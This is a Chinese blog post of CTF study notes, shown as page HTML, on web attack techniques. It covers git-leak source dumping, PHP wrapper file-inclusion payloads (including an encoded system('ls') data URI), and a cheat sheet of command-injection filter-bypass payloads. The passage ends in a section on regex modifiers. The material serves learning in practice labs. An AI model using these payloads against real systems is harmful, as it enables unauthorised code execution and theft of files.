@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"alunxzhou.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.13.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="一、学习记录1.1git泄露既然题目提示了git泄露漏洞，那么直接下载源码">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网安基础总结七">
+<meta property="og:url" content="http://alunxzhou.github.io/2022/11/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%83/index.html">
+<meta property="og:site_name" content="無与倫比">
+<meta property="og:description" content="一、学习记录1.1git泄露既然题目提示了git泄露漏洞，那么直接下载源码">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://alunxzhou.github.io/2022/11/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%83/1668326767960-f8c4c010-0017-4ee5-a219-ff086689a9e1.png">
+<meta property="og:image" content="http://alunxzhou.github.io/2022/11/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%83/1668326803125-bdae248e-5cf5-4b23-b4d5-fe198c48d3ca.png">
+<meta property="og:image" content="http://alunxzhou.github.io/2022/11/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%83/1668326815312-39ef32eb-1087-49b1-91b8-777fbe88800c.png">
+<meta property="article:published_time" content="2022-11-13T07:19:55.000Z">
+<meta property="article:modified_time" content="2023-01-07T07:22:53.203Z">
+<meta property="article:author" content="alun">
+<meta property="article:tag" content="web基础">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://alunxzhou.github.io/2022/11/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%83/1668326767960-f8c4c010-0017-4ee5-a219-ff086689a9e1.png">
+
+
+<link rel="canonical" href="http://alunxzhou.github.io/2022/11/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%83/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://alunxzhou.github.io/2022/11/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%83/","path":"2022/11/13/网安基础总结七/","title":"网安基础总结七"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>网安基础总结七 | 無与倫比</title>
+  
+
+
+
+
+
+<link rel="stylesheet" href="https://lib.baomitu.com/social-share.js/1.0.16/css/share.min.css">
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">無与倫比</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">菜鸟成长记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">一、学习记录</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1git%E6%B3%84%E9%9C%B2"><span class="nav-number">1.1.</span> <span class="nav-text">1.1git泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.2.</span> <span class="nav-text">2.1php伪协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2RCE%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%AD%E7%9A%84%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.</span> <span class="nav-text">2.2RCE之命令执行中的各种绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-1%E5%B8%B8%E8%A7%81%E7%AE%A1%E9%81%93%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.1.</span> <span class="nav-text">2.2.1常见管道符绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-2%E7%A9%BA%E6%A0%BC%E5%8F%8A%E5%85%B3%E9%94%AE%E8%AF%8D%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.2.</span> <span class="nav-text">2.2.2空格及关键词过滤绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-3%E5%BC%95%E5%85%A5%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%9A%84%E5%AD%97%E7%AC%A6%EF%BC%9A"><span class="nav-number">1.3.3.</span> <span class="nav-text">2.2.3引入绕过空格过滤的字符：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-4%E8%BF%90%E7%AE%97%E7%AC%A6%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.4.</span> <span class="nav-text">2.2.4运算符过滤绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-5%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.5.</span> <span class="nav-text">2.2.5引号绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-6%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="nav-number">1.3.6.</span> <span class="nav-text">2.2.6通配符绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-7%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%80%9A%E6%9D%80payload%EF%BC%88%E6%9D%A5%E8%87%AAY4%E5%A4%A7%E4%BD%AC%EF%BC%89%EF%BC%88%E4%BE%9D%E6%8D%AE%E9%A2%98%E7%9B%AE%E8%80%8C%E5%AE%9A%EF%BC%89"><span class="nav-number">1.3.7.</span> <span class="nav-text">2.2.7命令执行通杀payload（来自Y4大佬）（依据题目而定）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-8%E6%97%A0%E5%8F%82%E6%95%B0rce"><span class="nav-number">1.3.8.</span> <span class="nav-text">2.2.8无参数rce</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-9%E5%91%BD%E4%BB%A4%E5%88%86%E9%9A%94%E7%AC%A6%E8%A1%A8%E7%A4%BA"><span class="nav-number">1.3.9.</span> <span class="nav-text">2.2.9命令分隔符表示</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-3-0%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.3.10.</span> <span class="nav-text">2.3.0参考链接</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1linux%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="nav-number">1.4.</span> <span class="nav-text">3.1linux日志文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#3-1-1%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.4.1.</span> <span class="nav-text">3.1.1参考链接</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%BF%AE%E6%AD%A3%E7%AC%A6"><span class="nav-number">1.5.</span> <span class="nav-text">4.1正则表达式修正符</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#4-1-1%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.5.1.</span> <span class="nav-text">4.1.1参考链接</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1MISC"><span class="nav-number">1.6.</span> <span class="nav-text">5.1MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-1%E4%BC%AA%E5%8A%A0%E5%AF%86"><span class="nav-number">1.6.1.</span> <span class="nav-text">5.1.1伪加密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-2%E5%B7%A5%E5%85%B7stefhide"><span class="nav-number">1.6.2.</span> <span class="nav-text">5.1.2工具stefhide</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-1-3%E5%B7%A5%E5%85%B7F5-steganography"><span class="nav-number">1.6.3.</span> <span class="nav-text">5.1.3工具F5-steganography</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93"><span class="nav-number">2.</span> <span class="nav-text">二、学习总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E4%B8%8B%E5%91%A8%E8%AE%A1%E5%88%92"><span class="nav-number">3.</span> <span class="nav-text">三、下周计划</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="alun"
+      src="/images/alun.jpg">
+  <p class="site-author-name" itemprop="name">alun</p>
+  <div class="site-description" itemprop="description">静者心多妙，飘然思不群</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">50</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://alunxzhou.github.io/2022/11/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/alun.jpg">
+      <meta itemprop="name" content="alun">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="無与倫比">
+      <meta itemprop="description" content="静者心多妙，飘然思不群">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="网安基础总结七 | 無与倫比">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          网安基础总结七
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-11-13 15:19:55" itemprop="dateCreated datePublished" datetime="2022-11-13T15:19:55+08:00">2022-11-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-01-07 15:22:53" itemprop="dateModified" datetime="2023-01-07T15:22:53+08:00">2023-01-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AF%87/" itemprop="url" rel="index"><span itemprop="name">网安基础篇</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>7.1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>12 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="一、学习记录"><a href="#一、学习记录" class="headerlink" title="一、学习记录"></a>一、学习记录</h2><h3 id="1-1git泄露"><a href="#1-1git泄露" class="headerlink" title="1.1git泄露"></a>1.1git泄露</h3><p>既然题目提示了git泄露漏洞，那么直接下载源码</p>
+<p><img src="/2022/11/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%83/1668326767960-f8c4c010-0017-4ee5-a219-ff086689a9e1.png" alt="img"></p>
+<span id="more"></span>
+
+<p>python2 GitHack.py <a target="_blank" rel="noopener" href="http://challenge-924aa806bf44244c.sandbox.ctfhub.com:10800/.git/">http://challenge-924aa806bf44244c.sandbox.ctfhub.com:10800/.git/</a></p>
+<p>cd E:\tools\githack\dist\challenge-924aa806bf44244c.sandbox.ctfhub.com_10800<img src="/2022/11/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%83/1668326803125-bdae248e-5cf5-4b23-b4d5-fe198c48d3ca.png" alt="img"></p>
+<p>git log //查看历史记录</p>
+<p>git diff 57a6016556eba2e627e194b58d11833dec535a37  //比较版本</p>
+<p><img src="/2022/11/13/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%83/1668326815312-39ef32eb-1087-49b1-91b8-777fbe88800c.png" alt="img"></p>
+<h3 id="2-1php伪协议"><a href="#2-1php伪协议" class="headerlink" title="2.1php伪协议"></a>2.1php伪协议</h3><p>PHP的配置选项allow_url_include为ON的话，则include/require函数可以加载远程文件，这种漏洞被称为”远程文件包含漏洞(Remote File Inclusion RFI)”。</p>
+<p>allow_url_fopen = On 是否允许打开远程文件 allow_url_include = On 是否允许include/require远程文件</p>
+<p>常用到伪协议的php://input和php://filter.其中php://input要求allow_url_include设置为On</p>
+<p>file=php://filter/read=convert.base64-encode/resource=index.php</p>
+<p>?page=data://text/plain,</p>
+<p>?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=</p>
+<h3 id="2-2RCE之命令执行中的各种绕过"><a href="#2-2RCE之命令执行中的各种绕过" class="headerlink" title="2.2RCE之命令执行中的各种绕过"></a>2.2RCE之命令执行中的各种绕过</h3><h4 id="2-2-1常见管道符绕过"><a href="#2-2-1常见管道符绕过" class="headerlink" title="2.2.1常见管道符绕过"></a>2.2.1常见管道符绕过</h4><p>windows</p>
+<ol>
+<li> “|”：直接执行后面的语句。 </li>
+<li> “||”：如果前面的语句执行失败，则执行后面的语句，前面的语句只能为假才行。 </li>
+<li> “&amp;”：两条命令都执行，如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。 </li>
+<li> “&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。 </li>
+</ol>
+<p>linux</p>
+<ol>
+<li> “;”：执行完前面的语句再执行后面的语句。 </li>
+<li> “|”：显示后面语句的执行结果。 </li>
+<li> “||”：当前面的语句执行出错时，执行后面的语句。 </li>
+<li> “&amp;”：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。 </li>
+<li> “&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。 </li>
+</ol>
+<h4 id="2-2-2空格及关键词过滤绕过"><a href="#2-2-2空格及关键词过滤绕过" class="headerlink" title="2.2.2空格及关键词过滤绕过"></a>2.2.2空格及关键词过滤绕过</h4><p>我们使用ls flag_is_here列出子目录的文件，免不了绕过空格和flag的顾虑，绕过空格前面已经有writeup中附带了相关技巧，我们这里使用${IFS}绕过</p>
+<p>绕过flag关键字，我们使用的方法也是多种多样，这里不一一列出了，经过尝试可以使用(来绕过关键字过滤，如fl)ag_is_here</p>
+<p>$IFS 是一种 set 变量，当 shell 处理”命令替换”和”参数替换”时，shell 根据 IFS 的值，默认是 space,tab, newline 即空格，制表符，空行来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。</p>
+<p>直接用$IFS的话，会认为解析没结束，会把后面的也当做参数解析，比如cat$IFSflag.php，会把IFSflag一起当变量解析。这时候需要在$IFS后面进行截断，使解析为空，结束 $IFS，正常执行后面的内容。</p>
+<p>cat$IFS$1flag.php    //使用特殊变量</p>
+<p>cat${IFS}flag.php    //使用{}</p>
+<p>cat$IFS’f’lag.php        //使用引号</p>
+<p>cat$IFS\flag.php    //使用转义符</p>
+<p>cat$IFS?lag.php        //使用通配符</p>
+<p>在PHP下，空格可以使用%09(tab)、%0a(换行)替代</p>
+<h4 id="2-2-3引入绕过空格过滤的字符："><a href="#2-2-3引入绕过空格过滤的字符：" class="headerlink" title="2.2.3引入绕过空格过滤的字符："></a>2.2.3引入绕过空格过滤的字符：</h4><p>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等</p>
+<h4 id="2-2-4运算符过滤绕过"><a href="#2-2-4运算符过滤绕过" class="headerlink" title="2.2.4运算符过滤绕过"></a>2.2.4运算符过滤绕过</h4><p>首先我们要使用ls列目录，发现这里过滤了运算符，绕过的方式有%0a、%0d、%0D%0A。</p>
+<h4 id="2-2-5引号绕过"><a href="#2-2-5引号绕过" class="headerlink" title="2.2.5引号绕过"></a>2.2.5引号绕过</h4><p>c’at’|c”at”|c``at|c\at</p>
+<p>当cat命令被过滤时，可以用以下命令代替：</p>
+<p>tac|more|less|curl|nl|tail|sort|strings|head|paste|od -a</p>
+<p>strings：显示文件中的可打印内容，一般用来查看非文本内容</p>
+<p>sort：可针对文本文件的内容，以行为单位来排序。</p>
+<p>curl：会发送 GET 请求来获取链接内容到标准输出</p>
+<p>head：只显示前几行内容，如果文本较长，需要加上参数 -n</p>
+<p>paste：会把每个文件以列对列的方式，一列列地加以合并。</p>
+<h4 id="2-2-6通配符绕过"><a href="#2-2-6通配符绕过" class="headerlink" title="2.2.6通配符绕过"></a>2.2.6通配符绕过</h4><p>*和?是Linux中的两种通配符，可以用他们代替关键字</p>
+<p>cat * //输出当前目录下所有文件内容</p>
+<p>/bin/c?t fl?g.php</p>
+<h4 id="2-2-7命令执行通杀payload（来自Y4大佬）（依据题目而定）"><a href="#2-2-7命令执行通杀payload（来自Y4大佬）（依据题目而定）" class="headerlink" title="2.2.7命令执行通杀payload（来自Y4大佬）（依据题目而定）"></a>2.2.7命令执行通杀payload（来自Y4大佬）（依据题目而定）</h4><p>payload1:c=nl%09fla\g.php||</p>
+<p>payload2:c=nl%09fla\g.php%0a</p>
+<p>payload3:c=nl%09fla’’g.php%0a</p>
+<p>payload4:c=nl%09fla””g.php%0a</p>
+<p>payload5:c=vi%09fla\g.php%0a</p>
+<p>payload6:c=tac%09fla\g.php%0a</p>
+<p>payload7:c=uniq%09fla\g.php%0a</p>
+<p>payload8:c=nl&lt;fla’’g.php||</p>
+<p>payload9:c=nl%09fla\g.php%26</p>
+<h4 id="2-2-8无参数rce"><a href="#2-2-8无参数rce" class="headerlink" title="2.2.8无参数rce"></a>2.2.8无参数rce</h4><p>localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</p>
+<p>pos()：返回数组中的当前元素的值。</p>
+<p>array_reverse()：数组逆序 scandir()：获取目录下的文件</p>
+<p>next()：函数将内部指针指向数组中的下一个元素，并输出。 首先通过</p>
+<p>pos(localeconv())得到点号，因为scandir(’.’)表示得到当前目录下的文件，所以scandir(pos(localeconv()))就能得到flag.php了。</p>
+<h4 id="2-2-9命令分隔符表示"><a href="#2-2-9命令分隔符表示" class="headerlink" title="2.2.9命令分隔符表示"></a>2.2.9命令分隔符表示</h4><p>我们要让命令回显，那么进行命令分隔即可</p>
+<p>; //分号</p>
+<p>| //只执行后面那条命令</p>
+<p>|| //只执行前面那条命令</p>
+<p>&amp; //两条命令都会执行</p>
+<p>&amp;&amp; //两条命令都会执行</p>
+<h4 id="2-3-0参考链接"><a href="#2-3-0参考链接" class="headerlink" title="2.3.0参考链接"></a>2.3.0参考链接</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/15291426.html">https://www.cnblogs.com/pursue-security/p/15291426.html</a></p>
+<h3 id="3-1linux日志文件"><a href="#3-1linux日志文件" class="headerlink" title="3.1linux日志文件"></a>3.1linux日志文件</h3><p>　   root:x:0:0:root:/root:/bin/bash </p>
+<p>　　bin:x:1:1:bin:/bin:/sbin/nologin </p>
+<p>　　daemon:x:2:2:daemon:/sbin:/sbin/nologin </p>
+<p>　　desktop:x:80:80:desktop:/var/lib/menu/kde:/sbin/nologin </p>
+<p>　　mengqc:x:500:500:mengqc:/home/mengqc:/bin/bash </p>
+<p>　　在该文件中，每一行用户记录的各个数据段用“：”分隔，分别定义了用户的各方面属性。各个字段的顺序和含义如下： </p>
+<p>　　注册名：口令：用户标识号：组标识号：用户名：用户主目录：命令解释程序 </p>
+<p>　　(1)注册名(login_name)：用于区分不同的用户。在同一系统中注册名是惟一的。在很多系统上，该字段被限制在8个字符(字母或数字)的长度之内；并且要注意，通常在Linux系统中对字母大小写是敏感的。这与MSDOS/Windows是不一样的。 </p>
+<p>　　(2)口令(passwd)：系统用口令来验证用户的合法性。超级用户root或某些高级用户可以使用系统命令passwd来更改系统中所有用户的口令，普通用户也可以在登录系统后使用passwd命令来更改自己的口令。 </p>
+<p>　　现在的Unix/Linux系统中，口令不再直接保存在passwd文件中，通常将passwd文件中的口令字段使用一个“x”来代替，将/etc /shadow作为真正的口令文件，用于保存包括个人口令在内的数据。当然shadow文件是不能被普通用户读取的，只有超级用户才有权读取。 </p>
+<p>　　此外，需要注意的是，如果passwd字段中的第一个字符是“*”的话，那么，就表示该账号被查封了，系统不允许持有该账号的用户登录。 </p>
+<p>　　(3)用户标识号(UID)：UID是一个数值，是Linux系统中惟一的用户标识，用于区别不同的用户。在系统内部管理进程和文件保护时使用 UID字段。在Linux系统中，注册名和UID都可以用于标识用户，只不过对于系统来说UID更为重要；而对于用户来说注册名使用起来更方便。在某些特 定目的下，系统中可以存在多个拥有不同注册名、但UID相同的用户，事实上，这些使用不同注册名的用户实际上是同一个用户。 </p>
+<p>　　(4)组标识号(GID)：这是当前用户的缺省工作组标识。具有相似属性的多个用户可以被分配到同一个组内，每个组都有自己的组名，且以自己的组标 识号相区分。像UID一样，用户的组标识号也存放在passwd文件中。在现代的Unix/Linux中，每个用户可以同时属于多个组。除了在 passwd文件中指定其归属的基本组之外，还在/etc/group文件中指明一个组所包含用户。 </p>
+<p>　　(5)用户名(user_name)：包含有关用户的一些信息，如用户的真实姓名、办公室地址、联系电话等。在Linux系统中，mail和finger等程序利用这些信息来标识系统的用户。 </p>
+<p>　　(6)用户主目录(home_directory)：该字段定义了个人用户的主目录，当用户登录后，他的Shell将把该目录作为用户的工作目录。 在Unix/Linux系统中，超级用户root的工作目录为/root；而其它个人用户在/home目录下均有自己独立的工作环境，系统在该目录下为每 个用户配置了自己的主目录。个人用户的文件都放置在各自的 </p>
+<p>　　主目录下。 </p>
+<p>　　(7)命令解释程序(Shell)：Shell是当用户登录系统时运行的程序名称，通常是一个Shell程序的全路径名， </p>
+<p>　　如/bin/bash。 </p>
+<p>　　需要注意的是，系统管理员通常没有必要直接修改passwd文件，Linux提供一些账号管理工具帮助系统管理员来创建和维护用户账号。 </p>
+<p>　　Linux口令管理之/etc/passwd文件 </p>
+<p>　　/etc/passwd文件是Linux/UNIX安全的关键文件之一.该文件用于用户登录时校验 用户的口令,当然应当仅对root可写.文件中每行的一般格式为: </p>
+<p>　　LOGNAME:PASSWORD:UID:GID:USERINFO:HOME:SHELL </p>
+<p>​       nginx的日志文件为/var/log/nginx/access.log</p>
+<h4 id="3-1-1参考链接"><a href="#3-1-1参考链接" class="headerlink" title="3.1.1参考链接"></a>3.1.1参考链接</h4><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/fbb132422c9d">https://www.jianshu.com/p/fbb132422c9d</a></p>
+<h3 id="4-1正则表达式修正符"><a href="#4-1正则表达式修正符" class="headerlink" title="4.1正则表达式修正符"></a>4.1正则表达式修正符</h3><p>正则表达式中常用的模式修正符有i、g、m、s、U、x、a、D、e 等。</p>
+<p>它们之间可以组合搭配使用。</p>
+<p>i 不区分(ignore)大小写；</p>
